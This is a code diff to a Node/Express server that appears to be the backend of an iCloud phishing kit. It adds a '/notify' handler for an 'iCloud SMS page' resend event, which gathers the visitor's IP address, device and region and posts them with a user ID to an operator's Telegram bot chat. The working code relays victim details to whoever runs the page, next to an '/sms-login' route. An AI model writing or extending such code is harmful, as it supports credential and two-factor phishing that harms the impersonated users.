@@ -898,8 +898,45 @@ app.post("/sms-login", async (req, res) => {
 
 app.post("/notify", async (req, res) => {
   try {
-    const { email, userId } = req.body;
+    const { type, userId, email } = req.body;
 
+    // ✅ Handle resend SMS (from iCloud SMS page)
+    if (type === "resend_sms") {
+      const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+        req.headers["x-real-ip"] ||
+        req.connection.remoteAddress ||
+        "Unknown IP";
+
+      const userAgent = req.get("user-agent") || "Unknown";
+      const device = detectDevice(userAgent);
+      const region = await detectRegion(ip);
+
+      const message =
+        `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
+        `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+        `<b>🌍 Region:</b> ${region}\n` +
+        `<b>💻 Device:</b> ${device}\n` +
+        `<b>📍 IP:</b> ${ip}`;
+
+      const botToken = process.env.BOT_TOKEN;
+      const chatId = process.env.ADMIN_CHAT_ID;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+
+      console.log(`🔄 Resend SMS notification sent for userId: ${userId}`);
+      return res.json({ success: true });
+    }
+
+    // ✅ Handle generic notify (fallback)
     if (!email) {
       return res.status(400).json({ error: "Missing email" });
     }
